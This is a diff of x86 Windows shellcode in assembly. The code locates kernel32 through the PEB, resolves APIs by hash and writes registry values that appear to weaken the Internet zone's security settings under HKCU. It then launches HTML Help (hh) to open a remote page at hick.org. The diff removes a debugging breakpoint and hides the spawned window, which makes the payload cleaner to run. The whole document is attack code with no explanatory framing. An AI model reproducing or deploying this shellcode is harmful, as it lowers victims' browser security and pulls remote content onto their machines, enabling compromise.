@@ -3,13 +3,14 @@ GLOBAL _start
 
 _start:
 	cld
-	call get_find_function
+	call  get_find_function
 strings:
-	db "Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", 0
+	db    "Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", 0
 reg_values:
-	db "1004120012011405"
+	db    "1004120012011405"
 url:
-	db "explorer http://www.hick.org/~mmiller/bob.html", 0
+;	db    "explorer http://www.hick.org/~mmiller/bob.html", 0
+	db    "hh http://www.hick.org/~mmiller/bob.html", 0
 
 get_find_function:
 	call startup
@@ -55,102 +56,103 @@ find_function_finished:
 	retn 8
 
 startup:
-	pop  edi
-	pop  ebx
+	pop   edi
+	pop   ebx
 find_kernel32:
-	xor  edx, edx
-	mov  eax, [fs:edx+0x30]
-	test eax, eax
-	js   find_kernel32_9x
+	xor   edx, edx
+	mov   eax, [fs:edx+0x30]
+	test  eax, eax
+	js    find_kernel32_9x
 find_kernel32_nt:
-	mov  eax, [eax + 0x0c]
-	mov  esi, [eax + 0x1c]
+	mov   eax, [eax + 0x0c]
+	mov   esi, [eax + 0x1c]
 	lodsd
-	mov  eax, [eax + 0x8]
-	jmp  find_kernel32_finished
+	mov   eax, [eax + 0x8]
+	jmp   find_kernel32_finished
 find_kernel32_9x:
-	mov  eax, [eax + 0x34]
-	add  eax, 0x7c
-	mov  eax, [eax + 0x3c]
+	mov   eax, [eax + 0x34]
+	add   eax, 0x7c
+	mov   eax, [eax + 0x3c]
 find_kernel32_finished:
 
-	mov  ebp, esp
+	mov   ebp, esp
 find_kernel32_symbols:
-	push 0x16b3fe72 ; CreateProcessA
-	push eax
-	push 0xec0e4e8e ; LoadLibraryA
-	push eax
-	call edi
-	xchg eax, esi
-	call edi
-	mov  [ebp], eax
+	push  0x16b3fe72 ; CreateProcessA
+	push  eax
+	push  0xec0e4e8e ; LoadLibraryA
+	push  eax
+	call  edi
+	xchg  eax, esi
+	call  edi
+	mov   [ebp], eax
 
 load_advapi32:
-	push edx
-	push 0x32336970
-	push 0x61766461
-	push esp
-	call esi
+	push  edx
+	push  0x32336970
+	push  0x61766461
+	push  esp
+	call  esi
 
 resolve_advapi32_symbols:
-	push 0x02922ba9
-	push eax
-	push 0x2d1c9add
-	push eax
-	call edi
-	mov  [ebp + 0x4], eax
-	call edi
-	xchg eax, edi
-
-	xchg esi, ebx
+	push  0x02922ba9
+	push  eax
+	push  0x2d1c9add
+	push  eax
+	call  edi
+	mov   [ebp + 0x4], eax
+	call  edi
+	xchg  eax, edi
+ 
+	xchg  esi, ebx
 open_key:
-	push esp
-	push esi
-	push 0x80000001
-	call edi
-	pop  ebx
-	add  esi, byte (reg_values - strings)
+	push  esp
+	push  esi
+	push  0x80000001
+	call  edi
+	pop   ebx
+	add   esi, byte (reg_values - strings)
 
-	push eax
-	mov  edi, esp
+	push  eax
+	mov   edi, esp
 set_values:
-	cmp  byte [esi], 'e'
-	jz   initialize_structs
-	push eax
+	cmp   byte [esi], 'h'
+	jz    initialize_structs
+	push  eax
 	lodsd
-	push eax
-	mov  eax, esp
-	push byte 0x4
-	push edi
-	push byte 0x4
-	push byte 0x0
-	push eax
-	push ebx
-	call [ebp + 0x4]
-	jmp  set_values
+	push  eax
+	mov   eax, esp
+	push  byte 0x4
+	push  edi
+	push  byte 0x4
+	push  byte 0x0
+	push  eax
+	push  ebx
+	call  [ebp + 0x4]
+	jmp   set_values
 
 initialize_structs:
-	push 0x54
-	pop  ecx
-	sub  esp, ecx
-	mov  edi, esp
-	push edi
-	rep stosb
-	pop  edi
-	mov  byte [edi], 0x44
+	push  0x54
+	pop   ecx
+	sub   esp, ecx
+	mov   edi, esp
+	push  edi
+	rep   stosb
+	pop   edi
+	mov   byte [edi], 0x44
+	inc   byte [edi + 0x2c]
+	inc   byte [edi + 0x2d]
 execute_process:
-	push edi
-	push edi
-	push eax
-	push eax
-	push byte 0x10
-	push eax
-	push eax
-	push eax
-	push esi
-	push eax
-	int3
-	call [ebp]
+	push  edi
+	push  edi
+	push  eax
+	push  eax
+	push  byte 0x10
+	push  eax
+	push  eax
+	push  eax
+	push  esi
+	push  eax
+	call  [ebp]
 
 exit_process:
 	int3
